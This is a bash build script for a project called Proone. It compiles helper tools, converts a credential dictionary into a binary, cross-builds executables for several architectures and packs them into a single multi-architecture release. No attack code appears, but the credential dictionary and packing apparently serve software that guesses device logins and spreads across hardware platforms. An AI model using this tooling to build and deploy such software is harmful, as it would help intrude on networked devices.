#!/bin/bash
## \file
# \brief Build all target arches specified and native tools necessary for
#	fabrication of executables. You'll use this script a lot!
# \note xcomp is required for this script to function.
set -e # die on error

# The array of the native tools
PROONE_TOOLS="
	proone-pack
	proone-list-arch
	proone-mkcdict
	proone-mkdvault
	proone-ipaddr-arr
"

# Determine the default "include path"
# Set this variable to use paths other than the directory in which the script is
# located.
if [ -z "$INC_DIR" ]; then
	INC_DIR="$(dirname "${BASH_SOURCE[0]}")"
fi
INC_CONF="$INC_DIR/build-all.conf.sh"

if [ $# -ne 0 ]; then
	cat >&2 << EOF
Proone build-all script. Build all configured target executables and pack them
into one final FatELF-style executable for release.
Usage: $0
Config: $INC_CONF

This script requires that no argument is passed in order to run.
EOF
	exit 2
fi

# Load config
if [ -f "$INC_CONF" ]; then
	. "$INC_CONF"
else
	echo "$INC_CONF: no such file" >&2
	exit 1
fi

# Length check
LEN_BUILD_TARGET="${#BUILD_TARGETS[@]}"
if [ $LEN_BUILD_TARGET -le 0 ]; then
	echo "No target specified" >&2
	exit 2
fi

# Set defaults
[ -z "$PROONE_PREFIX" ] && PROONE_PREFIX="builds"
[ -z "$PROONE_DEBUG_SYM_DIR" ] && PROONE_DEBUG_SYM_DIR="$PROONE_PREFIX/debug"
[ -z "$PROONE_EXEC_DIR" ] && PROONE_EXEC_DIR="$PROONE_PREFIX/proone.bin"
[ -z "$PROONE_TOOLS_DIR" ] && PROONE_TOOLS_DIR="$PROONE_PREFIX/tools"
[ -z "$PROONE_MISC_BIN_DIR" ] && PROONE_MISC_BIN_DIR="$PROONE_PREFIX/misc"
[ -z "$PROONE_REL_DIR" ] && PROONE_REL_DIR="$PROONE_PREFIX/proone"
[ -z "$PROONE_DEBUG_SYM_PREFIX" ] && PROONE_DEBUG_SYM_PREFIX="$PROONE_DEBUG_SYM_DIR/"
[ -z "$PROONE_EXEC_PREFIX" ] && PROONE_EXEC_PREFIX="$PROONE_EXEC_DIR/stripped"
[ -z "$PROONE_ENTIRE_PREFIX" ] && PROONE_ENTIRE_PREFIX="$PROONE_EXEC_DIR/entire"
[ -z "$PROONE_ASM_PREFIX" ] && PROONE_ASM_PREFIX="$PROONE_EXEC_DIR/asm"
[ -z "$PROONE_READELF_PREFIX" ] && PROONE_READELF_PREFIX="$PROONE_EXEC_DIR/readelf"
[ -z "$PROONE_MISC_BIN_PREFIX" ] && PROONE_MISC_BIN_PREFIX="$PROONE_MISC_BIN_DIR/"
[ -z "$PROONE_REL_PREFIX" ] && PROONE_REL_PREFIX="$PROONE_REL_DIR/proone"
[ -z "$PROONE_CDICT" ] && PROONE_CDICT="$PROONE_PREFIX/cred_dict.bin"
[ -z "$PROONE_DVAULT" ] && PROONE_DVAULT="$PROONE_PREFIX/dvault.bin"

export PROONE_DEBUG_SYM_PREFIX
export PROONE_EXEC_PREFIX
export PROONE_ENTIRE_PREFIX
export PROONE_ASM_PREFIX
export PROONE_READELF_PREFIX
export PROONE_MISC_BIN_PREFIX

################################################################################

# Drop the root directory and set up the skeleton
rm -rf "$PROONE_PREFIX"
mkdir \
	"$PROONE_PREFIX"\
	"$PROONE_DEBUG_SYM_DIR"\
	"$PROONE_EXEC_DIR"\
	"$PROONE_TOOLS_DIR"\
	"$PROONE_MISC_BIN_DIR"\
	"$PROONE_REL_DIR"
# Ignore the clean up error because the project may not have been configured
set +e
make distclean
set -e

# Build native tools
./configure $PROONE_AM_CONF
make -j$(nproc) -C src $PROONE_TOOLS
for t in $PROONE_TOOLS; do
	cp -a "src/$t" "$PROONE_TOOLS_DIR"
done
# Copy the test suites as well
cp -a "./src/run-tests.sh" "./src/testlist" "$PROONE_MISC_BIN_DIR"
make distclean

# Generate dvault and cred dict binary
"$PROONE_TOOLS_DIR/proone-mkcdict"\
	"./src/proone_conf/cred_dict.txt"\
	"$PROONE_CDICT"
"$PROONE_TOOLS_DIR/proone-mkdvault" "$PROONE_CDICT" > "$PROONE_DVAULT"
DVAULT_SIZE=$(stat -c "%s" "$PROONE_DVAULT")

# Build all targets
for (( i = 0; i < LEN_BUILD_TARGET; i += 1 )); do
	read -ra tpl <<< "${BUILD_TARGETS[i]}"

	PROONE_BIN_OS="${tpl[0]}" \
	PROONE_BIN_ARCH="${tpl[1]}" \
	PROONE_HOST="${tpl[4]}" \
		xcomp "${tpl[2]}" "${tpl[3]}" "scripts/build-arch.sh"
done

# Do pack
"$PROONE_TOOLS_DIR/proone-pack"\
	"$PROONE_REL_PREFIX"\
	"$PROONE_DVAULT"\
	"$PROONE_EXEC_PREFIX".*
